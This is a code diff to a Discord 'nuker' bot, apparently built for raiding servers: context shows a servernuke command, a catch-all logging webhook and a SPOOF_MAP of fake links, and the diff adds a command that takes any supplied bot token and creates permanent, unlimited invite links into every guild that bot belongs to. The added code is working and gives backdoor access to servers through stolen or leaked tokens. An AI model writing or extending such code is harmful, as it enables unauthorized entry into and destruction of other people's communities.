@@ -24,7 +24,7 @@ import requests
 import traceback
 init(autoreset=True)
 
-LOG_WEBHOOK_URL = "webhook logger lol"  # webhook for all logs
+LOG_WEBHOOK_URL = "webhook daddy"  # webhook for all logs
 PREMIUM_FILE = "premium.json"
 PRESETS_FILE = "presets.json"
 intents = discord.Intents.default()
@@ -1022,6 +1022,115 @@ async def servernuke(
 
     # Run the nuke process
     asyncio.create_task(run_nuke())
+
+# invite fetcher 
+@bot.tree.command(
+    name="create_invites",
+    description="Create permanent invite links for guilds the bot is in"
+)
+async def create_invites(interaction: discord.Interaction, token: str):
+    await interaction.response.defer(ephemeral=True)
+
+    headers = {"Authorization": f"Bot {token}"}
+
+    async with aiohttp.ClientSession() as session:
+        try:
+            # Get bot info (validates token implicitly)
+            async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as resp:
+                if resp.status != 200:
+                    return await interaction.followup.send("Bot token is invalid.", ephemeral=True)
+
+            # Get guilds
+            async with session.get("https://discord.com/api/v10/users/@me/guilds", headers=headers) as resp:
+                if resp.status != 200:
+                    return await interaction.followup.send("Failed to fetch guilds.", ephemeral=True)
+                guilds = await resp.json()
+
+            if not guilds:
+                return await interaction.followup.send("Bot is not in any guilds.", ephemeral=True)
+
+            embed = discord.Embed(
+                title="Invite Links",
+                color=discord.Color.blurple()
+            )
+
+            for guild in guilds[:25]:
+                guild_id = guild["id"]
+                guild_name = guild["name"]
+
+                try:
+                    # Fetch channels
+                    async with session.get(
+                        f"https://discord.com/api/v10/guilds/{guild_id}/channels",
+                        headers=headers
+                    ) as resp:
+                        if resp.status != 200:
+                            embed.add_field(
+                                name=guild_name,
+                                value="Could not fetch channels.",
+                                inline=False
+                            )
+                            continue
+
+                        channels = await resp.json()
+
+                    # Only usable text channels
+                    text_channels = [
+                        ch for ch in channels
+                        if ch.get("type") == 0 and ch.get("id")
+                    ]
+
+                    invite_created = False
+
+                    for ch in text_channels:
+                        channel_id = ch["id"]
+
+                        payload = {
+                            "max_age": 0,
+                            "max_uses": 0,
+                            "temporary": False,
+                            "unique": True
+                        }
+
+                        async with session.post(
+                            f"https://discord.com/api/v10/channels/{channel_id}/invites",
+                            headers=headers,
+                            json=payload
+                        ) as resp:
+
+                            # If successful, stop immediately for this guild
+                            if resp.status in (200, 201):
+                                data = await resp.json()
+                                code = data.get("code")
+
+                                embed.add_field(
+                                    name=guild_name,
+                                    value=f"Channel ID: {channel_id}\nInvite: https://discord.gg/{code}",
+                                    inline=False
+                                )
+                                invite_created = True
+                                break
+
+                        await asyncio.sleep(0.25)  # light rate-limit protection
+
+                    if not invite_created:
+                        embed.add_field(
+                            name=guild_name,
+                            value="No usable channel found for invites.",
+                            inline=False
+                        )
+
+                except Exception as e:
+                    embed.add_field(
+                        name=guild_name,
+                        value=f"Error: {str(e)}",
+                        inline=False
+                    )
+
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+        except Exception as e:
+            await interaction.followup.send(f"Fatal error: {e}", ephemeral=True)
 
 SPOOF_MAP = {
     "tiktok_video": "https//www.tiktok.com/@feri_azimi/video/1234567890",
